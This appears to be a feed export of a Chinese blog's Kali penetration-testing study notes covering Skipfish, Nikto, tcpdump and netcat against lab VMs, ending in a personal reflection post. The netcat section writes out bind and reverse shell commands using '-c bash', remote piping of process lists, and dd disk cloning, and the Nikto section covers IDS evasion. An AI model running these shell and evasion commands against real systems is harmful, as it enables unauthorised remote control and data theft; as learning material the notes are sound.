--auth-user-filed usename --auth-user admin -auth-pass-filed password -auth-pass password --auth-verify-url http://192.168.1.109/dvwa/index.php -I /dvwa/ http://192.168.1.109/dvwa/</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Skipfish&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Skipfish&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Skipfish&quot;&gt;&lt;/a&gt;ka
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Skipfish" scheme="http://0xmj.club/tags/Skipfish/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Nikto</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Nikto/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Nikto/</id>
    <published>2018-02-27T11:47:03.000Z</published>
    <updated>2018-02-27T11:47:51.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Nikto"><a href="#kali渗透测试之Web渗透-扫描工具-Nikto" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Nikto"></a>kali渗透测试之Web渗透-扫描工具-Nikto</h1><h2 id="任务4：实验环境Metasploaitable和侦察HTTRACK"><a href="#任务4：实验环境Metasploaitable和侦察HTTRACK" class="headerlink" title="任务4：实验环境Metasploaitable和侦察HTTRACK"></a>任务4：实验环境Metasploaitable和侦察HTTRACK</h2><p>httrack 克隆一个网站页面到本地<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231143_886.png" alt=""><br>mkdir dvwa 创建一个目录<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231145_468.png" alt=""></p><p>侦察【减少与目标系统交互】</p><pre><code>Httrack：将WEB可下载的页面下载到本机，再进行本地检查【kali下安装】##可到此网站获取代理：hidemyass.com【免费代理需小心】</code></pre><h2 id="任务5：扫描工具-Nikto"><a href="#任务5：扫描工具-Nikto" class="headerlink" title="任务5：扫描工具-Nikto"></a>任务5：扫描工具-Nikto</h2><p>基于WEB的扫描工具，基本都支持两种扫描模式。代理截断模式，<strong>主动扫描模式</strong></p><p>手动扫描：作为用户操作发现页面存在的问题，但可能会存在遗漏</p><p>自动扫描：基于字典，提高速度，但存在误报和触发警告</p><p>参考书：Web_Penetration_Testing_with_Kali_Linux</p><p>Nikto【纯主动型】<br>   Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。<br>扫描内容：</p><pre><code>1、软件版本2、搜索存在安全隐患的文件【如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码】3、服务器配置漏洞【组件可能存在默认配置】    4、WEB Application层面的安全隐患【xss，SQL注入等】    5、避免404误判        ·很多服务器不遵守RFC标准，对于不存在的对象返回200响应码        ·依据响应文件内容判断，不同扩展名【jsp、cji】的文件404响应内容不同        ·去除时间信息后的内容取MD5值        ·参数：-no404【不进行误判尝试判断，可能存在误判】</code></pre><p>命令详解：</p><pre><code>nikto 主要参数man nikto 更多参数nikto -update   #直接更新数据库，厂商网址可能被墙 【在此网站可下载最新版http://cirt.net/nikto/UPDATES/】nikto  -list-plugins       #插件列表</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251346_435.jpg" alt=""></p><pre><code>nikto -host http://1.1.1.1 （目标）nikto -host 192.168.1.1 -ssl -port 443,8443,995 扫描端口例如：nikto -host www.baidu.com -port 443 -sslssl即https的端口默认为443</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041704_648.png" alt=""></p><p>nikto -host <a href="http://192.168.1.109/dvwa/" target="_blank" rel="external">http://192.168.1.109/dvwa/</a>           #指定网站目录扫描</p><pre><code>nikto -host 192.168.1.1.109 -port 80,443      #可指定多个端口【加-output：输出结果】nikto -host host.txt   #扫描多个IPnmap -p80 192.168.1.0/24 -oG - | nikto -host -        #结合nmap，对一个网段内开放了80端口的主机进行扫描 nikto -host https://www.baidu.com -useproxy http://localhost:8087     #使用代理-vhost  【+域名】   #虚拟IP，区分网站【使用背景：一个ip对应多个网站】</code></pre><p>交互性参数【用于扫描过程中】</p><pre><code>回车：报告当前状态v：正在扫描的详细信息（路径，结果等）#再按v就停止d：极其详细的信息，包括传strong text输内容     #e：错误信息                                    #p：显示进度                               #r：重定向                                   #c：cookiea：身份认证q：退出N：下一个主机（用于多个IP）P：暂停</code></pre><p>nikto配置文件【大部分需要登录进网站，才能进行扫描】</p><pre><code>    -id+    #使用http身份认证【但现在很少】支持指定cookie    vi /etv/nikto.conf</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251338_899.jpg" alt=""></p><pre><code>    #修改useagent【默认配置，容易被管理员发现】    USERAGENT=Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_604.jpg" alt=""></p><pre><code>    #抓包分析，获取cookie</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_197.jpg" alt=""></p><pre><code>    #修改cookie信息【让nikto获得身份认证，进行进一步扫描】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_949.jpg" alt=""></p><pre><code>    -evasion：使用LibWhisker中对IDS的逃避技术，可使用以下几种类型    1、随机URL编码（非UTF-8方式）    2、自选路径（/./）    3、过早结束的URL    4、优先考虑长随机字符串    5、参数欺骗    6、使用TAB作为命令的分隔符    7、使用变化的URL    8、使用windows路径分隔符”\“</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_7.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Nikto&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Nikto&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Nikto&quot;&gt;&lt;/a&gt;kali渗透测试之We
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Nikto" scheme="http://0xmj.club/tags/Nikto/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-工具-TCPDUMP</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7-TCPDUMP/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-工具-TCPDUMP/</id>
    <published>2018-02-27T11:42:43.000Z</published>
    <updated>2018-02-27T11:44:07.033Z</updated>
    
    <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-TCPDUMP</p><h2 id="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><a href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录" class="headerlink" title="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"></a>TCPDUMP-抓包、筛选、高级筛选、过程文档记录</h2><p>TCPDUMP</p><p>  No-GUI的抓包分析工具</p><p>  Linux、Unix系统默认安装</p><h3 id="TCPdump—–抓包"><a href="#TCPdump—–抓包" class="headerlink" title="TCPdump—–抓包"></a>TCPdump—–抓包</h3><p>抓包</p><p>  默认只抓68个字节</p><p>  指定端口 -s0指定包有多大就抓多大<br>  tcpdump -i eth0 -s 0 -w file.pcap</p><p>  tcpdump -i eth0 port 22</p><p>读取抓包文件</p><p>  Tcpdump -r file.pcap</p><h3 id="选项介绍"><a href="#选项介绍" class="headerlink" title="选项介绍"></a>选项介绍</h3><p>-A 以ASCII格式打印出所有分组，并将链路层的头最小化。 </p><p>-c 在收到指定的数量的分组后，tcpdump就会停止。 </p><p>-C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </p><p>-d 将匹配信息包的代码以人们能够理解的汇编格式给出。 </p><p>-dd 将匹配信息包的代码以c语言程序段的格式给出。 </p><p>-ddd 将匹配信息包的代码以十进制的形式给出。 </p><p>-D 打印出系统中所有可以用tcpdump截包的网络接口。 </p><p>-e 在输出行打印出数据链路层的头部信息。 </p><p>-E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </p><p>-f 将外部的Internet地址以数字的形式打印出来。 </p><p>-F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </p><p>-i 指定监听的网络接口。 </p><p>-l 使标准输出变为缓冲行形式，可以把数据导出到文件。 </p><p>-L 列出网络接口的已知数据链路。 </p><p>-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </p><p>-M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </p><p>-b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</p><p>-n 不把网络地址转换成名字。</p><p>-nn 不进行端口名称的转换。</p><p>-N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </p><p>-t 在输出的每一行不打印时间戳。 </p><p>-O 不运行分组分组匹配（packet-matching）代码优化程序。 </p><p>-P 不将网络接口设置成混杂模式。 </p><p>-q 快速输出。只输出较少的协议信息。 </p><p>-r 从指定的文件中读取包(这些包一般通过-w选项产生)。 </p><p>-S 将tcp的序列号以绝对值形式输出，而不是相对值。 </p><p>-s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p><p>-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </p><p>-t 不在每一行中输出时间戳。 </p><p>-tt 在每一行中输出非格式化的时间戳。 </p><p>-ttt 输出本行和前面一行之间的时间差。 </p><p>-tttt 在每一行中输出由date处理的默认格式的时间戳。 </p><p>-u 输出未解码的NFS句柄。 </p><p>-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </p><p>-vv 输出详细的报文信息。 </p><p>-w 直接将分组写入文件中，而不是不分析并打印出来。</p><p>root:～# tcpdump -h          </p><pre><code> enter code heretcpdump version 4.3.0libpcap version 1.3.0Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ][ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds]             [ -i interface ] [ -j tstamptype ] [ -M secret ]             [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]             [ -W filecount ] [ -y datalinktype] [ -z command ]             [ -Z user ] [ expression ]</code></pre><p>root:～# tcpdump -i eth0 -s 0 -w a.cap     //监听网络接口字节为0保存到a.cap文件中</p><p>tcpdump: listening on eth0, link-type EN10MB(Ethernet), capture size 65535 bytes</p><p>^C15 packets captured</p><p>15 packets receiced by filter</p><p>0 packets drodded by kernel</p><p>root:～# tcpdump -r a.cap                  //读取a.cap文件内容</p><p>root:～# tcpdump -A -r a.cap               //以ASCII格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -X -r a.cap               //以十六进制格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -i eth0 tcp port 22</p><p>TCPDUMP——筛选</p><p>  tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>  tcpdump -n src host 145.254.160.237 -r http.cap</p><p>  tcpdump -n dst host 145.254.160.237 -r http.cap</p><p>  tcpdump -n port 53 -r http.cap</p><p>  tcpdump -nX port 80 -r http.cap</p><p>root:～/Downloads# tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>reading from file http.cap, link type En10MB(Ethernet)</p><p>145.253.2.203.53</p><p>145.254.160.237.3009</p><p>145.254.160.237.3371</p><p>145.254.160.237.3372</p><p>216.239.59.99.80</p><p>65.208.228.223.80</p><p>0                  1                    2                   3</p><p>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|          Source Port          |     Destination Port          |       </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                        Sequence Number                        |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Acknowledgment Nuber                     |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|  Date  |      |C|E|U|A|P|R|A|F|                               |</p><p>| Offset |  Res.|W|C|R|C|S|S|Y|I|         Windwos               |</p><p>|        |      |R|E|G|K|H|T|N|N|                               |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|            Checksum           |     Urgent Pointer            |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Options               |     Padding      |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                                data                           |          </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>CEUAPRSF</p><p>00011000 = 24 in decimal</p><p>TCPDUMP——高级筛选</p><p>  tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p><p>过程文档记录</p><p>  Dradis</p><pre><code>短期临时小团队资源共享各种插件导入文件</code></pre><p>  keepnote</p><p>  Truecrypt</p><p>应用程序—–&gt;报告工具库—–&gt;Documentation—–&gt;dradis</p><p>应用程序—–&gt;Office—–&gt;KeepNote</p><p>New Notebook</p><p>新建一个keepnote</p><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#kali渗透测试之Web渗透-工具-TCPDUMP&lt;/p&gt;
&lt;h2 id=&quot;TCPDUMP-抓包、筛选、高级筛选、过程文档记录&quot;&gt;&lt;a href=&quot;#TCPDUMP-抓包、筛选、高级筛选、过程文档记录&quot; class=&quot;headerlink&quot; title=&quot;TCPDUMP-
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="TCPDUMP" scheme="http://0xmj.club/tags/TCPDUMP/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-工具-NETCAT</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7-NETCAT/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-工具-NETCAT/</id>
    <published>2018-02-27T11:38:09.000Z</published>
    <updated>2018-02-27T11:44:10.425Z</updated>
    
    <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-NETCAT</p><p>##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)<br>网络工具中的瑞士军刀——小身材、大智慧<br>侦听模式/传输模式<br>telnet/获取banner信息<br>传输文本信息<br>传输文件目录<br>加密传输文件<br>远程控制/木马<br>加密所有流量<br>流媒体服务器<br>远程克隆硬盘</p><h3 id="NC—–TELNET-banner"><a href="#NC—–TELNET-banner" class="headerlink" title="NC—–TELNET/banner"></a>NC—–TELNET/banner</h3><p>nc -nv 1.1.1.1 10<br>nc -nv 1.1.1.1 25<br>nc -nv 1.1.1.1 80<br>root:~# nc -h               //它的基本用法<br> root:~# nc -v               //端口扫描<br>root:~# mtr 200.106.0.20    //追踪一下路由<br>root:~# nc -vn              //显示详细的终端信息，不会Dns解析<br>root:~# ping pop3. 163.com<br>//连接ip邮箱（客户端链接服务器端）<br>root:~# nc -vn 123.125.50.29 110<br>USER<br>USER 12asdfg<br>USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==</p><p>root:~# base64<br>fanghong.yuan@163.com<br>（按ctrl+d邮箱编码成：ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==）</p><p>root:~# ping smtp.163.com</p><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6fanghong.yuan@163.com535 Error: authentication failed</code></pre><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6&lt;fanghong.yuan@163.com&gt;535 Error: authentication failed</code></pre><p>root:~# nc -nv 10.1.1.11 80</p><pre><code>(UNKNOWN) [10.1.1.11] 80 (http) openhead /&lt;html&gt;&lt;head&gt;&lt;titile&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;Twiki&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;wevDAV&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="NC—–传输文本信息"><a href="#NC—–传输文本信息" class="headerlink" title="NC—–传输文本信息"></a>NC—–传输文本信息</h3><p>A: nc -l -p 4444</p><p>B: nc -nv 1.1.1.1 4444</p><p>远程电子取证信息收集</p><p>开启两台系统kalix64和kalix32</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333       //打开端口333</p><p>root@kali:~# netstat -pantu | grep 333     //查看端口33是否打开<br>ifconfig查看地址：10.1.1.12<br>kali 64Bit</p><p>root:~# nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open<br><img src="http://oy0tigw51.bkt.clouddn.com/201802271914_628.png" alt=""><br>然后两台电脑实现聊天的功能！</p><h3 id="远程电子取证"><a href="#远程电子取证" class="headerlink" title="远程电子取证"></a>远程电子取证</h3><p>kali 32Bit</p><p>root@kali:~# nnc -l -p 333       //打开端口333</p><p>kali 64Bit</p><p>root:~# ls -l | nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>root:~# ps aux              //查看可疑的进程</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333 &gt; ps.txt   监听333端口有信息重定向到ps.txt文件里</p><p>kali 64Bit<br>root:~# ps aux | nc -nv 10.1.1.12 333 -q 1<br>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>kali 32Bit<br>root@kali:~# cat ps.txt         //查看ps.txt文件<br>kali 32Bit<br>root@kali:~# nc -l -p 333 &gt; lsof.txt</p><p>kali 64Bit</p><p>root:~# lsof | nc -nv 10.1.1.12 333 -q 1</p><p>(UNKNOWN) [10.1.1.12] 333 (?)  open</p><p>kali 32Bit</p><p>root@kali:~# more lsof.txt    //这个文件比较多，所以用more查看文件</p><h3 id="NC—-传输文件-目录"><a href="#NC—-传输文件-目录" class="headerlink" title="NC—-传输文件/目录"></a>NC—-传输文件/目录</h3><p>传输文件</p><pre><code>A: nc -lp 333 &gt; 1.mp4 侦听此端口 接受文件B: nc -nv 1.1.1.1. 333 &lt; 1.mp4 - q 1 发送到A的计算机 只连接一秒或A: nc -q -lp 333 &lt; a.mp4 把视频文件放到333侦听端口 发送B: nc -nv 1.1.1.1 333 &gt; 2.mp4 客户端链接的得到文件</code></pre><p>传输目录</p><pre><code>A: tar -cvf - music/ | nc -lp 333 - q 1B: nc -nv 1.1.1.1 333 | tar -xvf -</code></pre><p>加密传文件</p><pre><code>A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4          文件解密B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1     文件加密</code></pre><p>A:</p><p>root:~/Desktop# nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p><p>Enter passphrase: xxxx </p><p>B:</p><p>root:~/Desktop# mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p><p>Enter the passphrase (maximum of 512 characters)</p><p>Please use a combination of upper and lower case letters and numbers.</p><p>Enter passhrase: (UNKNOWN) [10.1.1.12] 333 (?) open</p><p>en</p><p>Enter passphrase: xxxx</p><p>NC不自带mcrypt,需要自己安装！</p><h3 id="NC—–流媒体服务"><a href="#NC—–流媒体服务" class="headerlink" title="NC—–流媒体服务"></a>NC—–流媒体服务</h3><pre><code>A: cat 1.mp4 | nc -lp 333B: nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></pre><h3 id="NC—–端口扫描"><a href="#NC—–端口扫描" class="headerlink" title="NC—–端口扫描"></a>NC—–端口扫描</h3><p>  nc -nvz 1.1.1.1 -65536</p><p>  nc -vnzu 1.1.1.1 1-1024</p><p>root@1kali:~# nc -h</p><p>[v1.10-38]</p><p>connect to somewhere:   nc [-options] hostname port[s] [ports] … </p><p>listen for inbound: nc -l -p port [-options] [hostname] [port]</p><p>options:</p><pre><code>-c shell commands   as `-e&#39;; use /bin/sh to exec [dangerous!!]-e filename     program to exec after connect [dangerous!!]-b          allow broadcasts-g gateway      source-routing hop point[s], up to 8                          设置路由器跃程通信网关，最高可设置8个。-G num          source-routing pointer: 4, 8, 12, ...                         设置来源路由指向器，其数值为4的倍数。-h          this cruft -i secs         delay interval for lines sent, ports sca                      延时的间隔    -k                      set keepalive option on socket-l          listen mode, for inbound connects                             监听模式,入站连接-n          numeric-only IP addresses, no DNS                             直接使用ip地址,而不用域名服务器-o file         hex dump of traffic                                           指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port         local port number                                             本地端口-r          randomize local and remote ports                              随机本地和远程端口 -q secs         quit after EOF on stdin and delay of secs-s addr         local source address  -T tos          set Type Of Service-t          answer TELNET negotiation   -u          UDP mode                                                      udp  模式-v          verbose [use twice to be more verbose]                        显示过程,vv 更多-w secs         timeout for connects and final net reads                      等待连接超时-z          zero-I/O mode [used for scanning]                             使用输入/输出模式，只在扫描通信端口时使用。</code></pre><h3 id="NC—–远程克隆硬盘"><a href="#NC—–远程克隆硬盘" class="headerlink" title="NC—–远程克隆硬盘"></a>NC—–远程克隆硬盘</h3><pre><code> A: nc -lp 333 | dd of=/dev/sda B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></pre><p>远程电子取证，可以讲目标服务器远程复制，或者内存。</p><h3 id="NC—–远程控制"><a href="#NC—–远程控制" class="headerlink" title="NC—–远程控制"></a>NC—–远程控制</h3><p>正向：</p><pre><code>A: nc  -lp 333 -  bashB: nc  1.1.1.1 333</code></pre><p>反向：</p><pre><code>A: nc -nv 1.1.1.1 333B: nc -lp 333 -c bash</code></pre><p>注：Windows用户把bash改成cmd;</p><p>root@kali:~# ifconfig</p><p>eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  </p><pre><code>      inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0      inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1      RX packets:46 errors:0 dropped:0 overruns:0 frame:0      TX packets:49 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:1000       RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)      Interrupt:19 Base address:0x2000 </code></pre><p>lo        Link encap:Local Loopback  </p><pre><code>      inet addr:127.0.0.1  Mask:255.0.0.0      inet6 addr: ::1/128 Scope:Host      UP LOOPBACK RUNNING  MTU:65536  Metric:1      RX packets:20 errors:0 dropped:0 overruns:0 frame:0      TX packets:20 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:0       RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)</code></pre><p>A:</p><p>root@kali:~# nc -nv 192.168.1.115 333 -c bash </p><p>(UNKNOWN) [192.168.1.115] 333 (?) open</p><p>ls </p><p>pwd</p><p>没有任何反应</p><p>B:</p><p>root:~# nc -lp 333</p><p>ls</p><p>Desktop</p><p>/root</p><p>ifconfig</p><p>……(一串文字）</p><p>请求来控制我！</p><p>NC—–NCAT</p><p>  Nc缺乏就加密和身份验证的能力</p><p>  Ncat包含于nmap工具包中</p><p>  A: ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</p><p>  B: ncat -nv 1.1.1.1 333 –ssl</p><p>不同系统/平台的nc参数功能不尽相同</p><p>root:~# man nc</p><p>root:~# nc -h</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#kali渗透测试之Web渗透-工具-NETCAT&lt;/p&gt;
&lt;p&gt;##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)&lt;br&gt;网络工具中的瑞士军刀——小身材、大智慧&lt;br&gt;侦听模式/传输模式&lt;br&gt;telnet/获取banner信息&lt;br&gt;传输文本信息&lt;b
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="NETCAT" scheme="http://0xmj.club/tags/NETCAT/"/>
    
  </entry>
  
  <entry>
    <title>17-11反思与进取</title>
    <link href="http://0xmj.club/2017/11/22/17-11%E5%8F%8D%E6%80%9D%E4%B8%8E%E8%BF%9B%E5%8F%96/"/>
    <id>http://0xmj.club/2017/11/22/17-11反思与进取/</id>
    <published>2017-11-22T09:10:55.000Z</published>
    <updated>2017-11-22T09:15:35.278Z</updated>
    
    <content type="html"><![CDATA[<p>#反思与进取<br><img src="http://oy0tigw51.bkt.clouddn.com/201711202038_238.png" alt=""><br>很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大于自身的抉择。</p><p>从5月份开始忙着转专业到现在转入信安专业，我也都没忘记自己高考报名这所学校的初衷，也如愿的进入自己理想的状态， 期间太过于迷茫， 总是怀疑自己到底可不可以，如果放弃每天都可以打打游戏，谈谈恋爱，扯扯不知所云的理想，这多舒服啊，但我也总觉得有人告诉我，“你如果每天都很难受，那么你每天都会成长，当你回过头来发现，你必定会恍然大悟自己的难受是有多么值得。”<br>人总是犯贱和懒惰的， 